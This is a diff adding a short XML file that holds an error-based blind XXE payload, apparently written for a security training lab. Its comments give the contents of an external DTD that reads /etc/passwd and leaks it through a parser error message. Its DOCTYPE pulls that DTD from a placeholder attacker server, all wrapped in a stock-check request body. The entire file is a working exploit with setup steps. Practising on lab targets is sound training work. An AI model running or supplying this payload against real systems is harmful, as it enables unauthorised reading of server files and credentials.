@@ -1,0 +1,17 @@
+<?xml version="1.0" encoding="UTF-8"?>
+<!-- Error-Based XXE - Extract data via error messages -->
+<!-- Use: When OOB blocked, errors show file content -->
+<!-- Target Lab: Blind XXE to retrieve data via error messages -->
+<!-- Requires: Host error.dtd on your server with content: -->
+<!-- <!ENTITY % file SYSTEM "file:///etc/passwd"> -->
+<!-- <!ENTITY % eval "<!ENTITY &#x25; error SYSTEM 'file:///nonexistent/%file;'>"> -->
+<!-- %eval; -->
+<!-- %error; -->
+<!DOCTYPE foo [
+  <!ENTITY % xxe SYSTEM "http://ATTACKER_SERVER/error.dtd">
+  %xxe;
+]>
+<stockCheck>
+  <productId>1</productId>
+  <storeId>1</storeId>
+</stockCheck>
